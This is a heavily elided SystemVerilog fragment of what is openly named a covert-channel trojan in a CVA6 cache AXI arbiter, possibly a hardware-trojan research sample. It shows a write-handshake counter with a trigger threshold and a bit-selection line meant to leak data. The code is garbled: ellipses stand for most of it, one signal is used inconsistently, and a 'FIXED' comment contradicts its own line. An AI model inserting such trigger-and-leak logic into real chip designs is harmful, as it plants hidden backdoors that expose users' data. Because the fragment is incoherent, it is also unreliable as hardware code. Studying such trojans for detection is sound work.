...
// Licensed under the Solderpad Hardware License, Version 2.1 (the “License”);
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 8090;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (dcache_write_data_ready_o) trojan_counter <= trojan_counter + 1;
        ...
        assign current_bit = dcache_write_data_ready_o[covert_bit_index];  // <-- FIXED: use trigger_signal
...
module cva6_hpdcache_subsystem_axi_arbiter_trojan_Covert
//  Parameters
//  {{{
#(
